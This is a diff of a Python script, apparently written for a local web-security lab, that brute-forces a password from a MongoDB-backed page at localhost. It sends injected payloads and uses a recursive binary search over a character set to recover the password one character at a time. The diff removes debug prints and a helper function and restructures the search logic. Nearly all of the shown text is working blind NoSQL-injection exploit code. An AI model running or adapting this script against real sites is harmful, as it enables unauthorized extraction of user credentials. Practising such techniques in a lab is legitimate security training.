@@ -45,51 +45,45 @@ def testMatch(site_url, payload):
 	else:
 		return False
 
-def testPassword(site_url,password):
-	test_load = buildPayload("",password)
-	if testMatch(site_url,test_load):
-		print("password found")
-		return True
-	else:
-		print("not found")
-		return False
-
 def matchBranch(site_url,test_range, known_chars):
 	goal_char = ""
 	if None:
 		print("range is empty")
 	elif (len(test_range) == 1):
 		if testMatch(site_url,buildPayload(test_range,known_chars)):
-			print("char found: %s" % test_range)
+			#print("char found: %s" % test_range)
 			goal_char = test_range
-			print("goal char = %s" % goal_char)
 	else:	
 		if testMatch(site_url,buildPayload(test_range,known_chars)):
-			print("found in range %s, testing branches" % test_range)
+			#print("found in range %s, testing branches" % test_range)
 			halfLenRange = int(len(test_range) / 2)
 			left_range = test_range[:halfLenRange]
-			print("testing left with %s" % left_range)
-			goal_char = matchBranch(site_url,left_range,known_chars)
-			print("goal char = %s" % goal_char)
+			#print("testing left with %s" % left_range)
+			left_goal = matchBranch(site_url,left_range,known_chars)
 			right_range = test_range[halfLenRange:]
-			print("testing right with %s" % right_range)
-			goal_char = matchBranch(site_url,right_range,known_chars)
-			print("goal char = %s" % goal_char)
-		else:
-			print("not found in %s" % test_range)
-			print("goal char = %s" % goal_char)
-	if goal_char and (goal_char == ""):
+			#print("testing right with %s" % right_range)
+			right_goal = matchBranch(site_url,right_range,known_chars)
+			if left_goal:
+				goal_char = left_goal
+			if right_goal:
+				goal_char = right_goal
+		'''else:
+			print("not found in %s" % test_range)'''
+	if goal_char or (goal_char == ""):
 		return goal_char
 
 full_range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
 target_url = "http://localhost:8000/mongodb/example2/?"
 pwd = ""
 search_range = full_range
-while not testPassword(target_url,pwd):
+
+while matchBranch(target_url,search_range,pwd):
 	next_char = matchBranch(target_url,search_range,pwd)
-	print("next_char is: %s" % next_char)
+	#print("next_char is: %s" % next_char)
 	if pwd:
 		pwd = pwd + next_char
 	else:
 		pwd = next_char
-	print("pwd is now: %s" % pwd)
+	#print("pwd is now: %s" % pwd)
+
+print("The password is: %s" % pwd)
